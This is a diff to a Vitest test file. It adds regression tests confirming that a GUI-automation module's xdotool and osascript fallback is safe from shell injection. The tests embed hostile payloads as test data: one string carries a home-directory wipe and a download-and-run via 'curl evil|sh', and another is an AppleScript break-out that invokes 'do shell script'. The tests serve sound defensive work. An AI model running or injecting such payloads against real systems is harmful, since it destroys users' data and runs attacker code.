@@ -7,6 +7,7 @@ import { parseKeyCombination, captureScreenshotNative, executeGuiAction, guiCont
 
 vi.mock('child_process', () => ({
   execSync: vi.fn(),
+  execFileSync: vi.fn(),
 }));
 
 vi.mock('fs', () => ({
@@ -19,7 +20,14 @@ vi.mock('os', () => ({
   tmpdir: vi.fn(() => '/tmp'),
 }));
 
-import { execSync } from 'child_process';
+// Force the native (xdotool/osascript) fallback path: make nut-js unavailable so
+// getNutjs() catches the rejected import and returns null. This is exactly the
+// headless/minimal-Linux situation where the shell-fallback RCE (S1) lived.
+vi.mock('@nut-tree-fork/nut-js', () => {
+  throw new Error('nut-js unavailable (test)');
+});
+
+import { execSync, execFileSync } from 'child_process';
 import { readFileSync, existsSync } from 'fs';
 
 // ============================================================================
@@ -105,16 +113,16 @@ describe('captureScreenshotNative', () => {
     expect(calls.some(([cmd]) => typeof cmd === 'string' && cmd.includes('powershell'))).toBe(true);
   });
 
-  it('calls screencapture on macOS', () => {
+  it('calls screencapture on macOS (via execFileSync, no shell)', () => {
     setPlatform('darwin');
-    vi.mocked(execSync).mockReturnValue(Buffer.from(''));
+    vi.mocked(execFileSync).mockReturnValue(Buffer.from(''));
     vi.mocked(existsSync).mockReturnValue(true);
     vi.mocked(readFileSync).mockReturnValue(Buffer.from('png'));
 
     const result = captureScreenshotNative();
     expect(result).toBeTruthy();
-    const calls = vi.mocked(execSync).mock.calls;
-    expect(calls.some(([cmd]) => typeof cmd === 'string' && cmd.includes('screencapture'))).toBe(true);
+    const calls = vi.mocked(execFileSync).mock.calls;
+    expect(calls.some(([cmd]) => cmd === 'screencapture')).toBe(true);
   });
 
   it('returns base64 string', () => {
@@ -193,6 +201,94 @@ describe('executeGuiAction', () => {
     const result = await executeGuiAction({ action: 'find_element', description: 'Submit button' });
     expect(result.success).toBe(true);
     expect(result.screenshot).toBeTruthy();
+  });
+});
+
+// ============================================================================
+// S1 — shell-injection safety of the native (xdotool/osascript) fallback
+// ============================================================================
+
+describe('gui fallback is shell-injection safe (S1)', () => {
+  const originalPlatform = process.platform;
+  function setPlatform(p: string) {
+    Object.defineProperty(process, 'platform', { value: p, configurable: true });
+  }
+  beforeEach(() => {
+    setPlatform('linux');
+    vi.mocked(execFileSync).mockReset().mockReturnValue(Buffer.from(''));
+    vi.mocked(execSync).mockReset().mockReturnValue(Buffer.from(''));
+  });
+  afterEach(() => {
+    Object.defineProperty(process, 'platform', { value: originalPlatform, configurable: true });
+    vi.restoreAllMocks();
+  });
+
+  it('type routes text through execFileSync as a discrete argv entry (no shell string)', async () => {
+    const payload = '$(rm -rf ~); `curl evil|sh`';
+    const result = await executeGuiAction({ action: 'type', text: payload });
+    expect(result.success).toBe(true);
+
+    // The dangerous payload must NEVER appear inside a single string command
+    // handed to a shell — execSync must not be used for the type fallback.
+    const shellCalls = vi.mocked(execSync).mock.calls;
+    expect(shellCalls.some(([cmd]) => typeof cmd === 'string' && cmd.includes(payload))).toBe(false);
+
+    // It must be passed to execFileSync as its own argv element, verbatim.
+    const fileCalls = vi.mocked(execFileSync).mock.calls;
+    const typeCall = fileCalls.find(([cmd]) => cmd === 'xdotool');
+    expect(typeCall).toBeTruthy();
+    const [, args] = typeCall as [string, string[]];
+    expect(args).toEqual(['type', '--clearmodifiers', '--', payload]);
+  });
+
+  it('key routes the combo through execFileSync as a single argv entry', async () => {
+    const result = await executeGuiAction({ action: 'key', keys: 'ctrl+c' });
+    expect(result.success).toBe(true);
+    const fileCalls = vi.mocked(execFileSync).mock.calls;
+    const keyCall = fileCalls.find(([cmd]) => cmd === 'xdotool');
+    expect(keyCall).toBeTruthy();
+    const [, args] = keyCall as [string, string[]];
+    expect(args[0]).toBe('key');
+    expect(args).toHaveLength(2); // ['key', 'ctrl+c'] — combo is ONE arg, unsplit by a shell
+    expect(execSync).not.toHaveBeenCalled();
+  });
+
+  it('click validates coordinates and passes integers as argv (no shell)', async () => {
+    const result = await executeGuiAction({ action: 'click', x: 100, y: 200 });
+    expect(result.success).toBe(true);
+    const fileCalls = vi.mocked(execFileSync).mock.calls;
+    const clickCall = fileCalls.find(([cmd]) => cmd === 'xdotool');
+    expect(clickCall).toBeTruthy();
+    const [, args] = clickCall as [string, string[]];
+    expect(args).toContain('mousemove');
+    expect(args).toContain('100');
+    expect(args).toContain('200');
+  });
+
+  it('click rejects a non-finite / negative coordinate before spawning', async () => {
+    const bad = await executeGuiAction({ action: 'click', x: Number.NaN, y: 5 });
+    expect(bad.success).toBe(false);
+    expect(bad.error).toMatch(/Invalid x/);
+    // Nothing was executed.
+    expect(execFileSync).not.toHaveBeenCalled();
+
+    const neg = await executeGuiAction({ action: 'click', x: -5000, y: -5000 });
+    expect(neg.success).toBe(false);
+    expect(neg.error).toMatch(/Invalid x/);
+  });
+
+  it('osascript key on darwin escapes the AppleScript string literal', async () => {
+    setPlatform('darwin');
+    // A key crafted to break out of the keystroke "..." literal.
+    await executeGuiAction({ action: 'key', keys: 'a"; do shell script "id' });
+    const fileCalls = vi.mocked(execFileSync).mock.calls;
+    const osa = fileCalls.find(([cmd]) => cmd === 'osascript');
+    expect(osa).toBeTruthy();
+    const [, args] = osa as [string, string[]];
+    const script = args[1];
+    // The raw unescaped break-out sequence must not appear; the quote is escaped.
+    expect(script).toContain('\\"');
+    expect(script).not.toMatch(/keystroke "a"; do shell script/);
   });
 });
 
